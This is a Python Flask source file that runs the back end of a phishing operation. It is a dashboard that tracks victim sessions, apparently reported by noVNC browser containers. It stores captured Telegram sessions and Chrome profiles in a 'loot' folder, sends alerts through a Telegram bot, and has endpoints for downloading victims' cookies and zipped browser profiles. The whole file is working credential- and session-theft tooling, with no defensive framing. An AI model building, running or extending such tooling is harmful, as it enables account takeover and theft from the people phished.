#!/usr/bin/env python3
"""
Controller - Central management for phishing sessions
"""

import os
import json
import asyncio
import threading
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string, send_file
from telegram_bot import get_bot

app = Flask(__name__)

# Configuration
DATA_DIR = Path("/app/data")
LOOT_DIR = Path("/app/loot")
SESSIONS_FILE = DATA_DIR / "sessions.json"

# Ensure directories exist
DATA_DIR.mkdir(parents=True, exist_ok=True)
LOOT_DIR.mkdir(parents=True, exist_ok=True)


def load_sessions():
    """Load sessions from file"""
    if SESSIONS_FILE.exists():
        with open(SESSIONS_FILE) as f:
            return json.load(f)
    return {}


def save_sessions(sessions):
    """Save sessions to file"""
    with open(SESSIONS_FILE, "w") as f:
        json.dump(sessions, f, indent=2)


def run_in_thread(func, *args):
    """Run function in background thread"""
    def _run():
        try:
            func(*args)
        except Exception as e:
            print(f"[Thread Error] {e}", flush=True)
            import traceback
            traceback.print_exc()
    thread = threading.Thread(target=_run, daemon=True)
    thread.start()


# Dashboard HTML template
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Dashboard</title>
    <meta http-equiv="refresh" content="10">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f0f; 
            color: #e0e0e0; 
            padding: 20px;
        }
        h1 { 
            color: #00ff88; 
            margin-bottom: 20px;
            font-size: 24px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
        }
        .stat-card h3 { color: #888; font-size: 12px; text-transform: uppercase; }
        .stat-card .value { font-size: 36px; color: #00ff88; margin-top: 10px; }
        .sessions {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            overflow: hidden;
        }
        .sessions h2 {
            padding: 15px 20px;
            background: #222;
            border-bottom: 1px solid #333;
            font-size: 16px;
        }
        table { width: 100%; border-collapse: collapse; }
        th, td { 
            padding: 12px 20px; 
            text-align: left; 
            border-bottom: 1px solid #333;
        }
        th { background: #222; color: #888; font-size: 12px; text-transform: uppercase; }
        .status { 
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        .status.active { background: #00ff8833; color: #00ff88; }
        .status.auth { background: #ff880033; color: #ff8800; }
        .status.captured { background: #ff000033; color: #ff4444; }
        .cookies { color: #00ff88; }
        .url { 
            max-width: 300px; 
            overflow: hidden; 
            text-overflow: ellipsis; 
            white-space: nowrap;
            font-family: monospace;
            font-size: 12px;
        }
        .actions button {
            background: #333;
            border: none;
            color: #fff;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            margin-right: 5px;
        }
        .actions button:hover { background: #444; }
        .empty { padding: 40px; text-align: center; color: #666; }
    </style>
</head>
<body>
    <h1>🎣 Phishing Dashboard</h1>
    
    <div class="stats">
        <div class="stat-card">
            <h3>Active Sessions</h3>
            <div class="value">{{ stats.active }}</div>
        </div>
        <div class="stat-card">
            <h3>Auth Captured</h3>
            <div class="value">{{ stats.captured }}</div>
        </div>
        <div class="stat-card">
            <h3>Total Cookies</h3>
            <div class="value">{{ stats.cookies }}</div>
        </div>
    </div>
    
    <div class="sessions">
        <h2>Sessions</h2>
        {% if sessions %}
        <table>
            <thead>
                <tr>
                    <th>Session ID</th>
                    <th>Status</th>
                    <th>Cookies</th>
                    <th>Last Activity</th>
                    <th>URL</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                {% for id, session in sessions.items() %}
                <tr>
                    <td><strong>{{ id }}</strong></td>
                    <td>
                        <span class="status {{ session.status }}">
                            {{ session.status | upper }}
                        </span>
                    </td>
                    <td class="cookies">{{ session.cookie_count }}</td>
                    <td>{{ session.last_activity }}</td>
                    <td class="url">{{ session.url }}</td>
                    <td class="actions">
                        <button onclick="window.open('/view/{{ id }}')">View</button>
                        <button onclick="exportSession('{{ id }}')">Export</button>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        {% else %}
        <div class="empty">No active sessions</div>
        {% endif %}
    </div>
    
    <script>
        function exportSession(id) {
            fetch('/api/export/' + id)
                .then(r => r.json())
                .then(data => alert('Profile exported to: ' + data.path));
        }
    </script>
</body>
</html>
"""


@app.route("/")
def dashboard():
    """Main dashboard"""
    sessions = load_sessions()
    
    stats = {
        "active": len([s for s in sessions.values() if s.get("status") == "active"]),
        "captured": len([s for s in sessions.values() if s.get("status") in ["auth", "captured"]]),
        "cookies": sum(s.get("cookie_count", 0) for s in sessions.values())
    }
    
    return render_template_string(DASHBOARD_HTML, sessions=sessions, stats=stats)


@app.route("/api/report", methods=["POST"])
def report():
    """Receive reports from noVNC containers"""
    data = request.json
    session_id = data.get("session_id")
    report_type = data.get("type")
    report_data = data.get("data", {})
    timestamp = data.get("timestamp", datetime.now().isoformat())
    
    sessions = load_sessions()
    bot = get_bot()
    
    if session_id not in sessions:
        sessions[session_id] = {
            "status": "active",
            "cookie_count": 0,
            "auth_count": 0,
            "created": timestamp,
            "last_activity": timestamp,
            "url": f"/view/{session_id}"
        }
    
    session = sessions[session_id]
    session["last_activity"] = timestamp
    
    # Handle Telegram session capture
    if report_type == "telegram_session":
        profile_path = report_data.get("profile_path", "")
        print(f"[Controller] Telegram session: {session_id}", flush=True)
        print(f"[Controller] Profile: {profile_path}", flush=True)
        
        session["status"] = "captured"
        session["profile_path"] = profile_path
        session["cookie_count"] = report_data.get("cookie_count", 0)
        
        # Send alert directly (synchronous)
        if profile_path:
            print(f"[Controller] Sending alert...", flush=True)
            try:
                result = bot.alert_telegram_session(session_id, profile_path)
                print(f"[Controller] Alert sent: {result}", flush=True)
            except Exception as e:
                print(f"[Controller] Alert error: {e}", flush=True)
                import traceback
                traceback.print_exc()
    
    save_sessions(sessions)
    
    return jsonify({"status": "ok"})


@app.route("/api/download/<session_id>/cookies")
def download_cookies(session_id):
    """Download cookies.json for a session"""
    cookies_file = LOOT_DIR / session_id / "cookies.json"
    if cookies_file.exists():
        return send_file(cookies_file, as_attachment=True, download_name=f"{session_id}_cookies.json")
    return jsonify({"error": "Not found"}), 404


@app.route("/api/download/<session_id>/profile")
def download_profile(session_id):
    """Download zipped profile for a session"""
    import zipfile
    import tempfile
    
    session_dir = LOOT_DIR / session_id
    if not session_dir.exists():
        return jsonify({"error": "Not found"}), 404
    
    # Find latest profile
    profiles = list(session_dir.glob("chrome_profile_*"))
    if not profiles:
        return jsonify({"error": "No profile found"}), 404
    
    profile_dir = sorted(profiles)[-1]
    
    # Create zip
    with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
        zip_path = tmp.name
    
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for file in profile_dir.rglob('*'):
            if file.is_file():
                zf.write(file, file.relative_to(profile_dir))
    
    return send_file(zip_path, as_attachment=True, download_name=f"{session_id}_profile.zip")


@app.route("/api/sessions")
def get_sessions():
    """Get all sessions as JSON"""
    return jsonify(load_sessions())


@app.route("/api/session/<session_id>")
def get_session(session_id):
    """Get specific session details"""
    sessions = load_sessions()
    if session_id in sessions:
        return jsonify(sessions[session_id])
    return jsonify({"error": "Session not found"}), 404


@app.route("/api/export/<session_id>")
def export_session(session_id):
    """Trigger profile export for a session"""
    sessions = load_sessions()
    if session_id in sessions:
        # In a real implementation, this would signal the container
        return jsonify({
            "status": "ok",
            "path": str(LOOT_DIR / session_id)
        })
    return jsonify({"error": "Session not found"}), 404


@app.route("/view/<session_id>")
def view_session(session_id):
    """Redirect to noVNC view for session"""
    # This would be handled by nginx in production
    return f"""
    <html>
    <head><title>Session {session_id}</title></head>
    <body style="margin:0;background:#000;">
        <iframe src="/novnc/{session_id}/vnc.html" 
                style="width:100%;height:100vh;border:none;">
        </iframe>
    </body>
    </html>
    """


@app.route("/health")
def health():
    """Health check endpoint"""
    return jsonify({"status": "healthy"})


if __name__ == "__main__":
    print("Starting Controller...")
    bot = get_bot()
    print(f"Telegram Bot: {'Configured' if bot.is_configured else 'Not configured'}")
    print(f"Chat ID: {bot.chat_id or 'Not configured'}")
    
    app.run(host="0.0.0.0", port=5000, debug=False)
